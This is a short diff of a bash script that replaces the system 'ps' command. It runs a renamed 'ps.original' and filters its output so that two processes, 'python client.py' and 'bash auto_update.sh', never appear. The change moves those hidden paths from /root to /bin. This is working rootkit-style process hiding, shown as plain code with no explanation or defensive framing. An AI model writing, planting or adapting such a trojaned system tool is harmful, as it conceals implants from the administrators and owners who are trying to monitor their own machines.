@@ -1,6 +1,6 @@
 #! /bin/bash
 
-hide="python /root/client.py"
-hide_2="bash /root/auto_update.sh"
+hide="python /bin/client.py"
+hide_2="bash /bin/auto_update.sh"
 
 ps.original $@ | grep -v "$hide" | grep -v "$hide_2"
